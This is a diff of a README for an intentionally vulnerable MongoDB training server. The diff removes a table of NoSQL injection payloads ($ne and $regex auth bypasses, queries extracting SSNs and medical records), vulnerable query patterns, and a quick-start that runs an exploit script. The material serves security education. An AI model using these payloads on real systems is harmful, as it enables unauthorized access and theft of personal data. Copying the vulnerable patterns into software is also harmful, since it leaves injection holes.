@@ -617,20 +617,9 @@ The application constructs MongoDB queries directly from user input without prop
 2. **No Input Validation**: Operators like `$ne`, `$regex`, `$gt`, `$where` are not filtered
 3. **Type Coercion**: MongoDB operators can change query logic to match unintended documents
 
-### Affected Code Patterns
 
-**Vulnerable Pattern 1:**
-```javascript
-// VULNERABLE: req.body passed directly
-const user = await User.findOne(req.body);
-```
 
-**Vulnerable Pattern 2:**
-```javascript
-// VULNERABLE: JSON.parse allows operators
-const queryObj = JSON.parse(req.query.q);
-const results = await User.find(queryObj);
-```
+
 
 ## Security Impact
 
@@ -650,61 +639,9 @@ To fix these vulnerabilities:
 5. **Parameterized Queries**: Use explicit field matching instead of dynamic query objects
 6. **Avoid `$where`**: Never use `$where` operator which allows JavaScript execution
 
-### Example Secure Code
-
-```javascript
-// SECURE: Validate input types
-app.post('/auth/login', async (req, res) => {
-  const { username, password } = req.body;
-  
-  // Validate types
-  if (typeof username !== 'string' || typeof password !== 'string') {
-    return res.status(400).json({ message: 'Invalid input types' });
-  }
-  
-  // Explicit query construction
-  const user = await User.findOne({ 
-    username: username.trim(),
-    password: password  // Note: In production, compare hashed passwords
-  });
-  
-  // ... rest of logic
-});
 ```
 
-## Quick Start Guide
 
-For a quick start, run these commands in order:
-
-```bash
-# 1. Install dependencies
-npm install
-pip3 install requests
-
-# 2. Start MongoDB (if not already running)
-# Check if MongoDB is running
-pgrep mongod
-
-# If not running, start MongoDB manually:
-mkdir -p ~/data/db
-mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log
-
-# Verify MongoDB is running
-pgrep mongod && echo "MongoDB is running" || echo "MongoDB is not running"
-netstat -tuln | grep 27017  # Should show MongoDB listening
-
-# 3. Start the server
-npm start
-
-# 4. In another terminal, verify the server is running
-curl http://localhost:4000/health
-
-# Expected output:
-# {"status":"ok","message":"Vulnerable server is running"}
-
-# 5. Run the exploit script
-python3 exploit/nosql_exploit.py
-```
 
 ### Stopping the Services
 
@@ -720,59 +657,6 @@ pkill mongod
 # Or if using systemd:
 sudo systemctl stop mongod
 ```
-
-## Quick Reference: Postman Tests Summary
-
-### Stage 1: Injection Discovery
-
-| Test | Method | Endpoint | Payload |
-|------|--------|----------|---------|
-| 1.1 Auth Bypass - Operator | POST | `/auth/login` | `{"username":"admin","password":{"$ne":null}}` |
-| 1.2 Auth Bypass - Regex | POST | `/auth/login` | `{"username":{"$regex":".*"},"password":{"$ne":null}}` |
-| 1.3 Extract All Users | GET | `/search?q=...` | `q={"$regex":".*"}` |
-| 1.4 Extract Admin Users | GET | `/search?q=...` | `q={"role":"admin"}` |
-
-**Note**: With multiple admin users (admin, superadmin), Test 1.4 will return both admin accounts.
-
-### Stage 2: Authentication Bypass
-
-| Test | Method | Endpoint | Headers | Notes |
-|------|--------|----------|---------|-------|
-| 2.1 Get Admin Token | POST | `/auth/login` | `Content-Type: application/json` | Use payload from 1.1 |
-| 2.2 Access Admin Export | POST | `/admin/export` | `Authorization: Bearer TOKEN` | Requires token from 2.1 |
-
-### Stage 3: Data Extraction
-
-| Test | Method | Endpoint | Payload |
-|------|--------|----------|---------|
-| 3.1 Extract Users with SSN | POST | `/users/filter` | `{"ssn":{"$exists":true,"$ne":null}}` |
-| 3.2 Extract Medical Records | POST | `/records/search` | `{"patientId":{"$regex":".*"}}` |
-| 3.3 Admin Query Injection | POST | `/admin/query` | `{"query":"{\"ssn\":{\"$regex\":\".*\"}}"}` |
-| 3.4 Admin User Filter | POST | `/admin/users` | `{"filter":{"ssn":{"$regex":".*"}}}` |
-
-**Note**: Tests 3.3 and 3.4 require admin token from Test 2.1.
-
-## Testing Checklist
-
-- [x] Stage 1: Injection discovery in login endpoint
-- [x] Stage 1: Injection discovery in search endpoint
-- [x] Stage 2: Authentication bypass without credentials
-- [x] Stage 2: Access protected admin endpoints
-- [x] Stage 3: Enumerate all users
-- [x] Stage 3: Extract sensitive data (SSN, medical records)
-- [x] JWT authentication implemented
-- [x] Role-based access control (RBAC) implemented
-- [x] Real MongoDB integration (not in-memory)
-
-## Notes
-
-- WARNING: This server is intentionally vulnerable for educational purposes only
-- Do not deploy this code to production or expose it to the internet
-- This is designed for security education, penetration testing training, and vulnerability research
-- Always use secure coding practices in production applications
-- MongoDB data is stored in `~/data/db` by default (can be changed)
-- MongoDB logs are written to `~/mongodb.log` when started manually
-- The server runs on port 4000 by default (can be changed with `PORT` environment variable)
 
 ## License
 
